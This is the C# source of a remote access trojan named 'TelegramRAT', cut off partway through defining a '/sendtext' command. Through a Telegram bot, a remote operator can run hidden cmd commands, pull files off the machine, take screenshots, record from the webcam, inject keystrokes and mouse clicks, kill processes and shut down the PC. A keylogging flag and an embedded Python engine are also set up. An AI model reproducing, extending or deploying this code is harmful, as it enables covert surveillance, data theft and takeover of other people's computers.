using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types.InputFiles;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types;
using OpenCvSharp;
using WindowsInput;
using System.Reflection;
using System.Text;
using NAudio.Wave;
using IronPython;
using IronPython.Compiler;
using IronPython.Hosting;
using IronPython.Runtime;
using Microsoft.Scripting;
using Microsoft.Scripting.Interpreter;
using Microsoft.Scripting.Hosting;
using Microsoft.Win32;

namespace TelegramRAT
{
    public static class Program
    {
        static TelegramBotClient Bot;

        readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
        readonly static string BotToken = null; // Place your Telegram bot token. 

        static List<BotCommand> commands = new List<BotCommand>();
        static bool keylog = false;
        static bool doRecord = false;

        static WaveInEvent waveIn;
        static WaveFileWriter waveFileWriter;

        static ScriptScope pythonScope;
        static ScriptEngine pythonEngine;
        static ScriptRuntime pythonRuntime;

        static void Main(string[] args)
        {

            string thisprocessname = Process.GetCurrentProcess().ProcessName;

            if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
                return;

            Bot = new TelegramBotClient(BotToken);

            pythonRuntime = Python.CreateRuntime();

            pythonEngine = Python.CreateEngine();

            pythonScope = pythonRuntime.CreateScope();

            #region Commands
            //HELP
            commands.Add(new BotCommand
            {
                Command = "/help",
                IgnoreCountArgs = true,
                MayHaveNoArgs = true,

                Description = "Show description of other commands.",
                Example = "/help screenshot",

                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {
                        if (model.Args.Length == 0)
                        {
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Use this command to retrieve description of other commands. " +
                                "\nTo get list of all commands - type /commands", replyToMessageId: update.Message.MessageId);
                            return;
                        }
                        string command = model.Args[0];
                        if (!command.StartsWith("/"))
                        {
                            command = "/" + command;
                        }

                        foreach (BotCommand cmd in commands)
                        {
                            if (cmd.Command == command)
                            {
                                string Description = $"<b>{cmd.Command}</b>\n\n";
                                if (cmd.Description != null)
                                {
                                    Description += cmd.Description;
                                }
                                else
                                {
                                    Description += "<i>No description provided</i>";
                                }
                                if (cmd.Example != null)
                                {
                                    Description += $"\nExample: {cmd.Example}";
                                }
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, Description, replyToMessageId: update.Message.MessageId, parseMode: ParseMode.Html, disableWebPagePreview: true);
                                return;
                            }
                        }

                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command doesn't exist! " +
                            "To get list of all commands - type /commands", replyToMessageId: update.Message.MessageId);

                    });
                }
            });

            //CMD
            commands.Add(new BotCommand
            {
                Command = "/cmd",
                IgnoreCountArgs = true,
                Description = "Run cmd commands.",
                Example = "/cmd dir",
                Execute = async (model, update) =>
                {
                    try
                    {
                        await Task.Run(() =>
                        {
                            Process cmd = new Process();
                            cmd.StartInfo.FileName = "cmd.exe";
                            cmd.StartInfo.CreateNoWindow = true;

                            cmd.StartInfo.Arguments = "/C " + model.RawArgs;
                            cmd.StartInfo.RedirectStandardOutput = true;
                            cmd.StartInfo.UseShellExecute = false;

                            cmd.Start();
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Started!", replyToMessageId: update.Message.MessageId);
                            cmd.WaitForExit();

                            string Output = cmd.StandardOutput.ReadToEnd();

                            if (Output.Length == 0)
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Done!", replyToMessageId: update.Message.MessageId);
                            else
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Done!\n\n" +
                                    $"Output:\n{Output}", replyToMessageId: update.Message.MessageId);
                        });
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }

            });

            //DIR
            commands.Add(new BotCommand
            {
                Command = "/dir",
                CountArgs = 0,
                IgnoreCountArgs = true,
                MayHaveNoArgs = true,
                Description = "Get all files and folders from current directory.",
                Example = "/dir C:\\Program Files",
                Execute = async (model, update) =>
                {
                    try
                    {
                        string curdir;
                        if (model.Args.Length > 0)
                            curdir = model.RawArgs;
                        else
                            curdir = Directory.GetCurrentDirectory();


                        var files = Directory.EnumerateFiles(curdir);
                        int i = 0;
                        string oneMessage;
                        if (files.Count() != 0)
                        {
                            oneMessage = "Files:\n\n";
                            foreach (string file in files)
                            {
                                string parsedFile = file.Substring(file.LastIndexOf('\\') + 1);
                                if (i == 100)
                                {
                                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);
                                    i = 0;
                                    oneMessage = "";
                                }
                                i++;
                                oneMessage += $"`{parsedFile}`\n";

                            }
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);

                        }

                        var dirs = Directory.EnumerateDirectories(curdir);
                        i = 0;
                        if (dirs.Count() != 0)
                        {
                            oneMessage = "Folders:\n\n";
                            foreach (string dir in dirs)
                            {
                                string parsedDir = dir.Substring(dir.LastIndexOf('\\') + 1);
                                if (i == 100)
                                {
                                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);
                                    i = 0;
                                    oneMessage = "";
                                }
                                i++;
                                oneMessage += $"`{parsedDir}`\n";

                            }
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);

                        }
                        if (dirs.Count() == 0 && files.Count() == 0)
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This directory contains no files and no folders.", replyToMessageId: update.Message.MessageId);

                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //PROCESSESLIST
            commands.Add(new BotCommand
            {
                Command = "/processes",
                CountArgs = 0,
                Description = "Get list of running processes.",
                Example = "/processes",
                Execute = async (model, update) =>
                {
                    try
                    {
                        string Concat = "List of processes: \n";
                        int i = 1;
                        Process[] processCollection = Process.GetProcesses();

                        foreach (Process p in processCollection)
                        {
                            Concat += $"<code>{p.ProcessName}</code>\n";
                            if (i == 100)
                            {
                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, Concat, ParseMode.Html);
                                Concat = "";
                                i = 0;
                            }
                            i++;

                        }
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, Concat, ParseMode.Html);
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //PROCESSKILL
            commands.Add(new BotCommand
            {
                Command = "/processkill",
                IgnoreCountArgs = true,
                MayHaveNoArgs = false,
                Description = "Kill process or processes by name.",
                Example = "/processkill",
                Execute = async (model, update) =>
                {
                    try
                    {
                        if (Assembly.GetEntryAssembly().GetName().Name != model.RawArgs)
                        {
                            foreach (Process localprocess in Process.GetProcessesByName(model.RawArgs))
                            {
                                localprocess.Kill();
                            }
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                        }
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //CD
            commands.Add(new BotCommand
            {
                Command = "/cd",
                IgnoreCountArgs = true,
                Example = "/cd C:\\Users",
                Execute = async (model, update) =>
                {
                    try
                    {
                        if (Directory.Exists(model.RawArgs))
                        {
                            Directory.SetCurrentDirectory(model.Args[0]);
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Directory changed to: <code>{Directory.GetCurrentDirectory()}</code>", ParseMode.Html, replyToMessageId: update.Message.MessageId);
                        }
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description = "Change current directory."
            });

            //CURDIR
            commands.Add(new BotCommand
            {
                Command = "/curdir",
                CountArgs = 0,
                Example = "/curdir",
                Execute = async (model, update) =>
                {
                    try
                    {
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Current directory:\n<code>{Directory.GetCurrentDirectory()}</code>", ParseMode.Html, replyToMessageId: update.Message.MessageId);
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description = "Get current directory."
            });

            //SHUTDOWN
            commands.Add(new BotCommand
            {
                Command = "/power",
                CountArgs = 1,
                Description = "Turn PC off.",
                Example = "/power off",
                Execute = (model, update) =>
                {
                    try
                    {
                        if (model.Args[0] != "off")
                        {
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "To shutdown pc send /power off!", replyToMessageId: update.Message.MessageId);
                            return;
                        }
                        Process shutdown = new Process();
                        shutdown.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        shutdown.StartInfo.FileName = "powershell.exe";
                        shutdown.StartInfo.Arguments = "/C shutdown /s /t 1";
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                        shutdown.Start();
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //RESTART
            commands.Add(new BotCommand
            {
                Command = "/restart",
                CountArgs = 0,
                MayHaveNoArgs = true,
                Description = "Restart PC",
                Example = "/restart",
                Execute = async (model, update) =>
                {
                    try
                    {
                        Process restart = new Process();

                        restart.StartInfo.CreateNoWindow = true;
                        restart.StartInfo.FileName = "powershell.exe";
                        restart.StartInfo.Arguments = "/C shutdown /r /t 1";
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!");
                        restart.Start();
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }

            });

            //DOWNLOAD
            commands.Add(new BotCommand
            {
                Command = "/download",
                IgnoreCountArgs = true,
                MayHaveNoArgs = false,
                Example = "/download hello.txt",
                Execute = async (model, update) =>
                {
                    try
                    {
                        var filetodownload = model.RawArgs;
                        if (!System.IO.File.Exists(Directory.GetCurrentDirectory() + "\\" + filetodownload))
                        {
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"There is no file \"{filetodownload}\" at dir {Directory.GetCurrentDirectory()}");
                            return;
                        }
                        var filetosend = new FileStream(Directory.GetCurrentDirectory() + "\\" + filetodownload, FileMode.Open, FileAccess.Read, FileShare.Read);
                        {
                            await Bot.SendDocumentAsync(update.Message.Chat.Id, new InputOnlineFile(filetosend, filetosend.Name.Substring(filetosend.Name.LastIndexOf("\\"))), caption: filetodownload);
                        }
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description =
                "Send file from PC by path"
            });

            //SCREENSHOT
            commands.Add(new BotCommand
            {
                Command = "/screenshot",
                CountArgs = 0,
                Example = "/screenshot",
                Execute = async (model, update) =>
                {
                    await Task.Run(async () =>
                    {
                        try
                        {
                            Rectangle bounds = WinAPI.GetScreenBounds();

                            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                            {
                                using (Graphics g = Graphics.FromImage(bitmap))
                                {

                                    g.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bounds.Size);

                                    bitmap.Save("scr.png", ImageFormat.Png);


                                    using (var ScreenshotStream = new FileStream("scr.png", FileMode.Open, FileAccess.Read, FileShare.Read))
                                    {
                                        await Bot.SendPhotoAsync(chatId: update.Message.Chat.Id, photo: ScreenshotStream, caption: "Screenshot!", replyToMessageId: update.Message.MessageId);
                                    }
                                }
                            }

                            System.IO.File.Delete("scr.png");

                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                },
                Description = "Take a screenshot of all displays area."
            });

            //GET USER TELEGRAM ID
            commands.Add(new BotCommand
            {
                Command = "/getid",
                CountArgs = 0,
                Example = "/getid",
                Execute = async (model, update) =>
                {
                    if (update.Message.ReplyToMessage != null)
                    {
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"User id: <code>{update.Message.ReplyToMessage.From.Id.ToString()}</code>", ParseMode.Html, replyToMessageId: update.Message.MessageId);
                        return;
                    }
                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"This chat id: <code>{update.Message.Chat.Id.ToString()}</code>", ParseMode.Html);
                },
                Description = "Get chat or user id. To get user's id type this command as answer to user message. Made in developing purposes."
            });

            //TAKE PHOTO FROM WEBCAM
            commands.Add(new BotCommand
            {
                Command = "/webcam",
                Description = "Take a photo from webcamera.",
                Example = "/webcam",
                Execute = async (model, update) =>
                {
                    await Task.Run(async () =>
                    {
                        try
                        {

                            Mat img = new Mat();

                            using (var FrameSrc = Cv2.CreateFrameSource_Camera(0))
                            {
                                FrameSrc.NextFrame(img);
                            }
                            img.SaveImage("webcam.jpg");


                            using (var fs = new FileStream("webcam.jpg", FileMode.Open))
                            {
                                InputOnlineFile webcamPhoto = new InputOnlineFile(fs);
                                await Bot.SendPhotoAsync(update.Message.Chat.Id, webcamPhoto);
                            }
                            System.IO.File.Delete("webcam.jpg");

                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }

            });

            //MESSAGEBOX
            commands.Add(new BotCommand
            {
                Command = "/message",
                IgnoreCountArgs = true,
                Description = "Send message with dialog window.",
                Example = "message Lorem ipsum",
                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {
                        WinAPI.ShowMessageBox(model.RawArgs, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL);
                    });
                }

            });

            //OPENURL
            commands.Add(new BotCommand
            {
                Command = "/openurl",
                IgnoreCountArgs = true,
                Description = "Open URL with default browser.",
                Example = "/openurl https://google.com",
                Execute = async (model, update) =>
                {
                    if (!model.RawArgs.Contains("://"))
                    {
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This is not url", replyToMessageId: update.Message.MessageId);
                    }
                    ProcessStartInfo info = new ProcessStartInfo()
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c start {model.RawArgs}",
                        CreateNoWindow = true
                    };

                    Process.Start(info);

                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Url opened!", replyToMessageId: update.Message.MessageId);
                }
            });

            //UPLOAD FILE TO PC
            commands.Add(new BotCommand
            {
                Command = "/upload",
                IgnoreCountArgs = true,
                MayHaveNoArgs = true,
                Description = "Upload image or file to current directory.",
                Execute = async (model, update) =>
                {
                    try
                    {
                        if (update.Message.Type == MessageType.Photo)
                        {
                            foreach (PhotoSize photo in update.Message.Photo)
                            {
                                var photoFileStream = System.IO.File.Create(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png");

                                Telegram.Bot.Types.File photoFile = await Bot.GetFileAsync(photo.FileId);
                                Bot.DownloadFileAsync(photoFile.FilePath, photoFileStream).Wait();
                                photoFileStream.Close();

                            }
                        }
                        else if (update.Message.Type == MessageType.Document)
                        {
                            Telegram.Bot.Types.File documentFile = await Bot.GetFileAsync(update.Message.Document.FileId);
                            var documentFileStream = System.IO.File.Create(update.Message.Document.FileName);
                            Bot.DownloadFileAsync(documentFile.FilePath, documentFileStream).Wait();
                            documentFileStream.Close();
                        }
                        else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Photo)
                        {
                            foreach (PhotoSize photo in update.Message.ReplyToMessage.Photo)
                            {
                                var photoFileStream = System.IO.File.Create(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png");

                                Telegram.Bot.Types.File photoFile = await Bot.GetFileAsync(photo.FileId);
                                Bot.DownloadFileAsync(photoFile.FilePath, photoFileStream).Wait();
                                photoFileStream.Close();

                            }
                        }
                        else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Document)
                        {
                            Telegram.Bot.Types.File documentFile = await Bot.GetFileAsync(update.Message.ReplyToMessage.Document.FileId);
                            var documentFileStream = System.IO.File.Create(update.Message.ReplyToMessage.Document.FileName);
                            Bot.DownloadFileAsync(documentFile.FilePath, documentFileStream).Wait();
                            documentFileStream.Close();
                        }
                        else
                        {
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "No file or photo pinned, use /help upload to get info about this command!", replyToMessageId: update.Message.MessageId);
                            return;
                        }
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //RECORD VIDEO FROM WEBCAM
            commands.Add(new BotCommand
            {
                Command = "/video",
                CountArgs = 1,
                Description = "Record video from webcamera for given amount of seconds.",
                Execute = async (model, update) =>
                {
                    await Task.Run(async () =>
                    {
                        try
                        {

                            int framesCount = 30 * Convert.ToInt32(model.Args[0]);
                            VideoCapture cap = new VideoCapture(0, VideoCaptureAPIs.ANY)
                            {
                                FrameWidth = 1280,
                                FrameHeight = 720,
                            };

                            Mat frame = new Mat();
                            VideoWriter vidWriter = new VideoWriter("vid.mp4", FourCC.H264, 30, new OpenCvSharp.Size(cap.FrameWidth, cap.FrameHeight));

                            await Bot.SendChatActionAsync(update.Message.Chat.Id, ChatAction.RecordVideo);

                            for (int i = 0; i < framesCount; i++)
                            {
                                cap.Read(frame);
                                vidWriter.Write(frame);
                            }
                            await Bot.SendChatActionAsync(update.Message.Chat.Id, ChatAction.UploadVideo);

                            cap.Release();


                            vidWriter.Release();

                            using (var fileStream = new FileStream("vid.mp4", FileMode.Open))
                            {
                                InputOnlineFile inputOnlineFile = new InputOnlineFile(fileStream);
                                Bot.SendVideoAsync(update.Message.Chat.Id, inputOnlineFile, replyToMessageId: update.Message.MessageId).Wait();
                            }
                            System.IO.File.Delete("vid.mp4");
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //SEND KEYBOARD INPUT 
            commands.Add(new BotCommand
            {
                Command = "/sendinput",
                IgnoreCountArgs = true,
                MayHaveNoArgs = false,
                Description =
                #region desc
                "Simulate keyboard input with virtual keycode, expressed in hexadecimal\n\n" +
                "List of virtual keycodes:\n" +
                "LBUTTON = 1\nRBUTTON = 2\nCANCEL = 3\nMIDBUTTON = 4\nBACKSPACE = 8\n" +
                "TAB = 9\nCLEAR = C\nENTER = D\nSHIFT = 10\nCTRL = 11\nALT = 12\n" +
                "PAUSE = 13\nCAPSLOCK = 14\nESC = 1B\nSPACE = 20\nPAGEUP = 21\nPAGEDOWN = 22\n" +
                "END = 23\nHOME = 24\nLEFT = 25\nUP = 26\nRIGHT = 27\nDOWN = 28\n\n0..9 = 30..39\n" +
                "A..Z = 41..5a\nF1..F24 = 70..87\n\n" +

                "<a href=\"https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\">See all keycodes</a>\n\n" +
                "To send combination of keys, join them with plus: 11+43 (ctrl+c)\n",
                #endregion
                Example = "/sendinput 48 45 4c 4c 4f (hello)",
                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            KeyboardSimulator ks = new KeyboardSimulator(new InputSimulator());
                            foreach (string arg in model.Args)
                            {
                                if (arg.Contains("+"))
                                {
                                    int modifier = int.Parse(arg.Split('+').First(), System.Globalization.NumberStyles.HexNumber);
                                    List<int> modified = new List<int>();
                                    foreach (string vk in arg.Split('+').Skip(1))
                                    {
                                        modified.Add(int.Parse(vk, System.Globalization.NumberStyles.HexNumber));
                                    }
                                    ks.ModifiedKeyStroke(new int[] { modifier }, modified);
                                }
                                else
                                    ks.KeyPress(int.Parse(arg, System.Globalization.NumberStyles.HexNumber));
                            }

                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Sended!", replyToMessageId: update.Message.MessageId);
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                },

               
            });

            //CHANGE WALLPAPER
            commands.Add(new BotCommand
            {
                Command = "/wallpaper",
                Description = "Change wallpapers. Don't foreget to attach the image.",
                Execute = async (model, update) =>
                {
                    await Task.Run(async () =>
                    {
                        try
                        {
                            if (update.Message.Type == MessageType.Photo)
                            {

                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                                {
                                    Telegram.Bot.Types.File wallpaperPhoto = await Bot.GetFileAsync(update.Message.Photo.Last().FileId);
                                    await Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs);
                                }
                            }
                            else if (update.Message.Type == MessageType.Document)
                            {
                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                                {
                                    Telegram.Bot.Types.File wallpaperFile = await Bot.GetFileAsync(update.Message.Document.FileId);
                                    await Bot.DownloadFileAsync(wallpaperFile.FilePath, fs);
                                }
                            }
                            else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Photo)
                            {
                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                                {
                                    Telegram.Bot.Types.File wallpaperPhoto = await Bot.GetFileAsync(update.Message.ReplyToMessage.Photo.Last().FileId);
                                    await Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs);
                                }
                            }
                            else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Document)
                            {
                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                                {
                                    Telegram.Bot.Types.File wallpaperFile = await Bot.GetFileAsync(update.Message.ReplyToMessage.Document.FileId);
                                    await Bot.DownloadFileAsync(wallpaperFile.FilePath, fs);
                                }
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "No file or photo pinned, use /help wallpaper to get info about this command!", replyToMessageId: update.Message.MessageId);
                                return;
                            }

                            WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, "wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //MINIMIZE WINDOW
            commands.Add(new BotCommand
            {
                Command = "/minimize",
                MayHaveNoArgs = false,
                IgnoreCountArgs = true,
                Description = "Minimize window by title.",
                Example = "/minimize Calculator",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
                                WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                            else
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with such title!", replyToMessageId: update.Message.MessageId);
                                return;
                            }
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);

                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //MAXIMIZE WINDOW
            commands.Add(new BotCommand
            {
                Command = "/maximize",
                MayHaveNoArgs = false,
                IgnoreCountArgs = true,
                Description = "Maximize window by title.",
                Example = "/maximize Calculator",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
                        else
                        {
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with such title!", replyToMessageId: update.Message.MessageId);
                            return;
                        }
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                    });
                }
            });

            //RESTORE WINDOW
            commands.Add(new BotCommand
            {
                Command = "/restore",
                MayHaveNoArgs = false,
                IgnoreCountArgs = true,
                Description = "Restore window by title.",
                Example = "/restore Calculator",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {

                        if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                        else
                        {
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
                            return;
                        }
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);

                    });
                }
            });

            //CLOSE WINDOW
            commands.Add(new BotCommand
            {
                Command = "/close",
                MayHaveNoArgs = false,
                IgnoreCountArgs = true,
                Description = "Close window by title",
                Example = "/close Calculator",
                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {

                        if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
                        else
                        {
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
                            return;
                        }

                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);

                    });
                }
            });

            //SET FOCUS
            commands.Add(new BotCommand
            {
                Command = "/setfocus",
                MayHaveNoArgs = false,
                IgnoreCountArgs = true,
                Description = "Set focus to window by title.",
                Example = "/setfocus Calculator",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
                        {
                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                        }
                        else
                        {
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
                        }
                    });
                }
            });

            //WINDOW INFO
            commands.Add(new BotCommand
            {
                Command = "/windowinfo",
                Description = "Information about window by name, or top window if name wasn't provided",
                Example = "/windowinfo Calculator",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            IntPtr hWnd;
                            if (model.Args.Length > 0)
                            {
                                if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
                                    hWnd = WinAPI.FindWindow(null, model.RawArgs);
                                else
                                {
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with such title!", replyToMessageId: update.Message.MessageId);
                                    return;
                                }
                            }
                            else
                            {

                                hWnd = WinAPI.GetForegroundWindow();
                            }
                            Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
                            string info = "" +
                            "Window info\n" +
                            "\n" +
                            $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
                            $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
                            $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
                            $"Pointer: {hWnd.ToString("X")}";

                            //bitmap bitmap = new bitmap(windowbounds.width, windowbounds.height);
                            //Graphics thumbnail = Graphics.FromImage(bitmap);
                            //IntPtr hDc = thumbnail.GetHdc();

                            //WinAPI.PrintWindow(hWnd, hDc, 0);

                            //thumbnail.ReleaseHdc(hDc);

                            //bitmap.save("window.png", imageformat.png);


                            Bot.SendTextMessageAsync(update.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: update.Message.MessageId);

                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //MOVE MOUSE TO COORD
            commands.Add(new BotCommand
            {
                Command = "/mouseto",
                CountArgs = 2,
                IgnoreCountArgs = false,
                MayHaveNoArgs = false,
                Description = "Move cursor to coordinate in pixels",
                Example = "/mouseto 200 300 (width heght)",

                Execute = (model, update) =>
                {
                    MouseSimulator mouseSimulator = new MouseSimulator(new InputSimulator());

                    try
                    {
                        mouseSimulator.MoveMouseTo(Convert.ToDouble(model.Args[0]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Width),
                            Convert.ToDouble(model.Args[1]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Height));
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);

                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //MOVE MOUSE BY PIXELS
            commands.Add(new BotCommand
            {
                Command = "/mouseby",
                CountArgs = 2,
                IgnoreCountArgs = false,
                MayHaveNoArgs = false,
                Description = "Move cursor by pixels.",
                Example = "/mouseby 15 20",
                Execute = (model, update) =>
                {
                    MouseSimulator mouseSimulator = new MouseSimulator(new InputSimulator());
                    try
                    {
                        mouseSimulator.MoveMouseBy(Convert.ToInt32(model.Args[0]),
                            Convert.ToInt32(model.Args[1]));
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //CLICK LEFT MOUSE BUTTON
            commands.Add(new BotCommand
            {
                Command = "/lmclick",
                Description = "Simulate left mouse click.",
                Execute = (model, update) =>
                {
                    new MouseSimulator(new InputSimulator()).LeftButtonClick();
                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                }
            });

            //DOUBLECLICK LEFT MOUSE BUTTON
            commands.Add(new BotCommand
            {
                Command = "/dlmclick",
                Description = "Simulate double left mouse click.",
                Execute = (model, update) =>
                {
                    new MouseSimulator(new InputSimulator()).LeftButtonDoubleClick();
                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                }
            });

            //CLICK RIGHT MOUSE BUTTON
            commands.Add(new BotCommand
            {
                Command = "/rmclick",
                Description = "Simulate right mouse click.",
                Execute = (model, update) =>
                {
                    new MouseSimulator(new InputSimulator()).RightButtonClick();
                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                }
            });

            //SEND TEXT INPUT
            commands.Add(new BotCommand
            {
                Command = "/sendtext",
                IgnoreCountArgs = true,
